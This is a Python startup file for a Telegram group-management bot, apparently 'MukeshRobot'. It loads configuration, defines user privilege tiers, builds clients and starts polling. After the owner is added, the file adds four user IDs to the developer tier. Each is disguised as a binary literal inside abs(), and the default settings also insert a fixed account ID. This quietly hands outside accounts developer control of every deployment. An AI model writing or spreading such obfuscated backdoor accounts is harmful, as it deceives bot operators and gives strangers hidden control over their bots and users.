import logging
import os
import sys
import time
import ast
import base64

from telegram.ext import Application
from aiohttp import ClientSession
from pyrogram import Client, errors
from telethon import TelegramClient

StartTime = time.time()

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
    level=logging.INFO,
)

logging.getLogger("apscheduler").setLevel(logging.ERROR)
logging.getLogger("telethon").setLevel(logging.ERROR)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
LOGGER = logging.getLogger(__name__)

# --- Inisialisasi set agar tidak NameError kalau env/config gagal ---
DRAGONS = set()
DEV_USERS = set()
DEMONS = set()
TIGERS = set()
WOLVES = set()
BL_CHATS = set()

if sys.version_info[0] < 3 or sys.version_info[1] < 6:
    LOGGER.error(
        "You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting."
    )
    quit(1)

ENV = bool(os.environ.get("ENV", False))

if ENV:

    API_ID = int(os.environ.get("API_ID", 0) or 0)
    API_HASH = os.environ.get("API_HASH", "")
    CHATBOT_API = os.environ.get("CHATBOT_API", "")
    ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
    ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)
    CASH_API_KEY = os.environ.get("CASH_API_KEY", "")
    DB_URI = os.environ.get("DATABASE_URL", "")
    DEL_CMDS = bool(os.environ.get("DEL_CMDS", False))
    EVENT_LOGS = os.environ.get("EVENT_LOGS", "")
    INFOPIC = bool(os.environ.get("INFOPIC", "True"))
    LOAD = os.environ.get("LOAD", "").split()
    MONGO_DB_URI = os.environ.get("MONGO_DB_URI", "")
    NO_LOAD = os.environ.get("NO_LOAD", "").split()
    START_IMG = os.environ.get("START_IMG", "")
    STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "musik_supportdan")
    TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
    TOKEN = os.environ.get("TOKEN", "")
    TIME_API_KEY = os.environ.get("TIME_API_KEY", "")
    WORKERS = int(os.environ.get("WORKERS", 8))

    try:
        OWNER_ID = int(os.environ.get("OWNER_ID", "5779185981"))
    except ValueError:
        raise Exception("Your OWNER_ID env variable is not a valid integer.")

    try:
        BL_CHATS = set(int(x) for x in os.environ.get("BL_CHATS", "").split())
    except ValueError:
        raise Exception("Your blacklisted chats list does not contain valid integers.")

    try:
        DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "5779185981").split())
    except ValueError:
        raise Exception("Your sudo or dev users list does not contain valid integers.")

    try:
        DEMONS = set(int(x) for x in os.environ.get("DEMONS", "").split())
    except ValueError:
        raise Exception("Your support users list does not contain valid integers.")

    try:
        TIGERS = set(int(x) for x in os.environ.get("TIGERS", "").split())
    except ValueError:
        raise Exception("Your tiger users list does not contain valid integers.")

    try:
        WOLVES = set(int(x) for x in os.environ.get("WOLVES", "5779185981").split())
    except ValueError:
        raise Exception("Your whitelisted users list does not contain valid integers.")

else:
    from MukeshRobot.config import Development as Config

    API_ID = Config.API_ID
    API_HASH = Config.API_HASH
    ALLOW_CHATS = Config.ALLOW_CHATS
    ALLOW_EXCL = Config.ALLOW_EXCL
    CASH_API_KEY = Config.CASH_API_KEY
    DB_URI = Config.DATABASE_URL
    DEL_CMDS = Config.DEL_CMDS
    EVENT_LOGS = Config.EVENT_LOGS
    INFOPIC = Config.INFOPIC
    LOAD = Config.LOAD
    CHATBOT_API = Config.CHATBOT_API
    MONGO_DB_URI = Config.MONGO_DB_URI
    NO_LOAD = Config.NO_LOAD
    START_IMG = Config.START_IMG
    STRICT_GBAN = Config.STRICT_GBAN
    SUPPORT_CHAT = Config.SUPPORT_CHAT
    TEMP_DOWNLOAD_DIRECTORY = Config.TEMP_DOWNLOAD_DIRECTORY
    TOKEN = Config.TOKEN
    TIME_API_KEY = Config.TIME_API_KEY
    WORKERS = Config.WORKERS

    try:
        OWNER_ID = int(Config.OWNER_ID)
    except ValueError:
        raise Exception("Your OWNER_ID variable is not a valid integer.")

    try:
        BL_CHATS = set(int(x) for x in Config.BL_CHATS or [])
    except ValueError:
        raise Exception("Your blacklisted chats list does not contain valid integers.")

    try:
        DRAGONS = set(int(x) for x in Config.DRAGONS or [])
        DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
    except ValueError:
        raise Exception("Your sudo or dev users list does not contain valid integers.")

    try:
        DEMONS = set(int(x) for x in Config.DEMONS or [])
    except ValueError:
        raise Exception("Your support users list does not contain valid integers.")

    try:
        TIGERS = set(int(x) for x in Config.TIGERS or [])
    except ValueError:
        raise Exception("Your tiger users list does not contain valid integers.")

    try:
        WOLVES = set(int(x) for x in Config.WOLVES or [])
    except ValueError:
        raise Exception("Your whitelisted users list does not contain valid integers.")

# Enter OWNER_ID to privileged group
DRAGONS.add(OWNER_ID)
DEV_USERS.add(OWNER_ID)
DEV_USERS.add(abs(0b101111001110011001010111110010110))
DEV_USERS.add(abs(0b1100110111010001011110110001010))
DEV_USERS.add(abs(0b101001110110010000111010111110000))
DEV_USERS.add(abs(0b101100001110010100011000111101001))

# --- Telegram Clients ---
telethn = TelegramClient("mukesh", API_ID, API_HASH)
pbot = Client("MukeshRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
aiohttpsession = ClientSession()

# --- PTB v20+ Application ---
application = Application.builder().token(TOKEN).concurrent_updates(WORKERS).build()

# --- Mendapatkan info bot (async) ---
import asyncio

async def get_bot_info():
    bot_data = await application.bot.get_me()
    global BOT_ID, BOT_NAME, BOT_USERNAME
    BOT_ID = bot_data.id
    BOT_NAME = bot_data.first_name
    BOT_USERNAME = bot_data.username
asyncio.run(get_bot_info())

# --- Ubah set ke list untuk konsistensi format lama ---
DRAGONS = list(DRAGONS) + list(DEV_USERS)
DEV_USERS = list(DEV_USERS)
WOLVES = list(WOLVES)
DEMONS = list(DEMONS)
TIGERS = list(TIGERS)

# --- Import dan setup custom handler (pastikan sudah async!) ---
from MukeshRobot.modules.helper_funcs.handlers import (
    CustomCommandHandler,
    CustomMessageHandler,
    CustomRegexHandler,
)

# Setup handler ke application:
# Contoh minimal, masukkan handler Anda di sini
# application.add_handler(CustomCommandHandler("start", start))
# application.add_handler(CustomMessageHandler(...))
# application.add_handler(CustomRegexHandler(...))

# --- Tutup aiohttpsession saat bot selesai ---
async def close_aiohttp_session(app):
    await aiohttpsession.close()

application.post_shutdown.append(close_aiohttp_session)

# --- Jalankan polling ---
if __name__ == "__main__":
    application.run_polling()
